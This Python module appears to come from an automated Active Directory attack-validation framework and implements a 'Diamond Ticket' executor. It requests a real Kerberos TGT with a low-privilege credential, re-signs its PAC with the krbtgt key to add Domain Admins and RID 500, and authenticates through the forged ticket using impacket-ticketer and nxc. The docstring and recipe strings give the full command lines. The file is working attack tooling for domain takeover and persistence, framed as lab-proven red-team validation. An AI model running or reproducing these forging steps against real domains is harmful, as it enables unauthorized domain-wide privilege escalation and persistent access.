"""DIAMOND-TICKET validation executor -- T4 (Kerberos ticket forging).

Request a REAL TGT with a live low-priv credential, then decrypt + modify its PAC
(add Domain Admins) and re-sign it with the krbtgt key -- a ticket that looks
legitimate (harder to detect than a golden), then authenticate through it:

    impacket-ticketer -request -user <bare-lowpriv> -password|-hashes <...>
        -aesKey/-nthash <krbtgt> -domain-sid <SID> -domain <d> -user-id 500
        -groups 512 <forged>                                        (forge via request)
    KRB5CCNAME=<ccache> nxc smb <fqdn> --use-kcache --kdcHost <dc>   (= the terminal)

Needs BOTH the krbtgt signing key (secret; threaded KRBTGT cap or ``cfg.forge_key``)
AND a live requester credential (``cfg.username``/``password``|``nt_hash``) -- the
requester is validated at EXECUTION, never pre-resolved as a param, and an
operator key is never substituted for an absent threaded krbtgt key. Non-mutating;
no rollback. ``verified_recipe=True`` (lab-proven on GOAD 27NOV2026, scored *proved*, secret-clean).
"""
from __future__ import annotations

from pathlib import Path

from ..recommend import ParamSpec, values
from .. import proof, states
from ._reveal_common import key_material
from .base import (SecretReveal, ValidationExecutor, ExecutorContext, Capability,
                   CAP_PRINCIPAL, CAP_AES_KEY, CAP_NT_HASH)
from .forge_common import (signing_key, key_flag, valid_key, resolve_domain_sid,
                           requester_argv, forge_and_reauth)


class DiamondTicketExecutor(ValidationExecutor):
    technique = "DIAMOND-TICKET"
    technique_class = "kerberos_forge"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True         # lab-proven on GOAD 27NOV2026 (forge+reauth, scored proved, secret-clean)
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_PERSISTENCE})
    recipe_ref = ("T4 DIAMOND = impacket-ticketer -request -user <lowpriv> -password/-hashes "
                  "-aesKey/-nthash <krbtgt> -domain-sid <SID> -domain <d> -groups 512 <user> ; "
                  "nxc --use-kcache reauth (recipe pinned in-lab)")

    def param_specs(self, ctx, finding):
        e = finding.entity or {}
        return [
            ParamSpec(name="forged_user", kind="free",
                      description="Name of the forged ticket's principal.",
                      recommended=e.get("forged_user") or "diamond_pwn",
                      rationale="A distinct name for the re-signed ticket."),
            ParamSpec(name="groups", kind="free",
                      description="Comma-separated group RIDs added to the PAC.",
                      recommended=e.get("groups") or "512", rationale="512 = Domain Admins."),
            ParamSpec(name="user_id", kind="free",
                      description="RID embedded in the PAC.",
                      recommended=e.get("user_id") or "500", rationale="500 = Administrator."),
            ParamSpec(name="domain_sid", kind="free",
                      description="Domain SID (auto-resolved via lookupsid if omitted).",
                      recommended=e.get("domain_sid") or "",
                      rationale="Resolved from the configured DC when not supplied.", required=False),
            ParamSpec(name="reauth_target", kind="target_host",
                      description="FQDN of a domain host to authenticate against with the forged ticket.",
                      recommended=e.get("reauth_target") or finding.host or "",
                      rationale="Any domain-joined host accepts a valid diamond ticket.",
                      required=True),
        ]

    def target_identity(self, ctx, finding, params):
        forged = params["forged_user"].value if "forged_user" in params else "diamond_pwn"
        return {"domain": ctx.config.domain, "principal": forged}

    def steps_preview(self, ctx, finding, params):
        v = values(params)
        return [
            f"impacket-ticketer -request -user {ctx.config.username or '<lowpriv>'} <auth> <key-flag> *** "
            f"-domain-sid {v.get('domain_sid') or '<auto>'} -domain {ctx.config.domain} "
            f"-user-id {v['user_id']} -groups {v['groups']} {v['forged_user']}",
            f"nxc smb {v['reauth_target']} --use-kcache --kdcHost {ctx.config.dc_ip}  (= the terminal proof)",
        ]

    def chain_pre(self, ctx, finding):
        return frozenset({states.KRBTGT})

    def chain_eff(self, ctx, finding):
        return frozenset({states.S_PERSISTENCE})

    def accepts_key(self, ctx, finding, cap):
        return (cap.channel in (CAP_AES_KEY, CAP_NT_HASH)
                and valid_key(cap.value, "aes" if cap.channel == CAP_AES_KEY else "nt"))

    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    def execute(self, ctx: ExecutorContext, finding, params) -> dict:
        # Private recovery channel, populated before downstream proof/cleanup.
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        def finish_artifact(*args):
            artifact.update(self._artifact(*args))
            return artifact

        cfg = ctx.config
        v = values(params)
        out_dir = Path(ctx.output_dir)
        steps: list = []
        errors: list = []
        gate = {"classifier": "not_required", "op": None}

        sid = resolve_domain_sid(ctx, v.get("domain_sid") or None)
        if not sid:
            errors.append("domain_sid_unresolved")
            return finish_artifact(steps, gate, None, False, errors)
        key, kind = signing_key(ctx)
        if not valid_key(key, kind):
            errors.append("no_signing_key")
            return finish_artifact(steps, gate, None, False, errors)
        req = requester_argv(cfg)                           # live requester cred, at execution (H4)
        if req is None:
            errors.append("no_requester_credential")
            return finish_artifact(steps, gate, None, False, errors)

        forged = v["forged_user"]
        forge_argv = (["impacket-ticketer", "-request", *req, key_flag(kind), key,
                       "-domain-sid", sid, "-domain", cfg.domain, "-user-id", v["user_id"],
                       "-groups", v["groups"], forged])
        ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, v["reauth_target"], out_dir,
                                               expect_principal=forged,
                                               on_ticket=lambda path: artifact["_reveal"].extend(
                                                   key_material(self.technique, "ccache", forged, path)))
        steps += fsteps
        errors += ferrors

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=ok, impersonated=forged,
            predicate=(f"requested a real TGT, re-signed its PAC (Domain Admins) with the krbtgt "
                       f"key as {forged} in {cfg.domain}, and authenticated through the forged ccache"),
            proof_token=proof.proof_token("DIAMOND-TICKET", cfg.domain, forged,
                                          "authn_success" if ok else "authn_failed"),
            extra={"forged_user": forged},
        )
        return finish_artifact(steps, gate, terminal_fact, ok, errors)

    def produced(self, ctx, finding, params, artifact):
        if not artifact.get("complete"):
            return []
        forged = params["forged_user"].value
        return [Capability(state=states.S_PERSISTENCE, channel=CAP_PRINCIPAL,
                           value=forged, principal=forged)]

    @staticmethod
    def _artifact(steps, gate, terminal_fact, complete, errors):
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": {"applied": False,
                             "rollback": {"performed": False, "verified": True, "method": None}},
                "terminal_fact": terminal_fact, "complete": complete, "errors": errors}
